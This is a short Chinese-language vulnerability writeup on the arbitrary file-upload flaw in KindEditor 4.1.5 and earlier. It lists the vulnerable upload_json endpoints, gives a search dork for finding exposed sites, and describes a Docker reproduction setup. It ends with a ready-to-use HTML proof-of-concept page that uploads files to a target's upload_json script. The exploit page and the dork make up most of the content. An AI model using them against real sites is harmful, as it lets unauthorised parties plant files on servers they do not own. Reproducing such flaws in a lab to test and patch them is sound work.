# kindeditor<=4.1.5文件上传漏洞

漏洞存在于kindeditor编辑器里，你能上传.txt和.html文件，支持php/asp/jsp/asp.net  
漏洞存在于小于等于kindeditor4.1.5编辑器中  
如何查看编辑器地址
http://192.168.3.148:8888/kindeditor-4.1.1/kindeditor-min.js  
关键字：  
allinurl:/examples/uploadbutton.html  
根本脚本语言自定义不同的上传地址，上传之前有必要验证文件upload_json.*的存在  
/kindeditor-4.1.1/asp/upload_json.asp  
/kindeditor-4.1.1/asp.net/upload_json.ashx  
/kindeditor-4.1.1/jsp/upload_json.jsp  
/kindeditor-4.1.1/php/upload_json.php  

复现环境搭建：  
php环境-dokcer-tutum/lamp  
kindeditor：  
https://github.com/kindsoft/kindeditor/archive/v4.1.1.zip

POC：

```html
<html><head>
<title>Uploader By ICE</title>
<script src="http://[Target]/kindeditor/kindeditor-min.js"></script&gt;
<script>
KindEditor.ready(function(K) {
var uploadbutton = K.uploadbutton({
button : K('#uploadButton')[0],
fieldName : 'imgFile',
url : 'http://[Target]/kindeditor/php/upload_json.asp?dir=file',
afterUpload : function(data) {
if (data.error === 0) {
var url = K.formatUrl(data.url, 'absolute');
K('#url').val(url);}
},
});
uploadbutton.fileBox.change(function(e) {
uploadbutton.submit();
});
});
</script></head><body>
<div class="upload">
<input class="ke-input-text" type="text" id="url" value="" readonly="readonly" />
<input type="button" id="uploadButton" value="Upload" />
</div>
</body>
</html>
```


## 参考

https://www.seebug.org/vuldb/ssvid-89546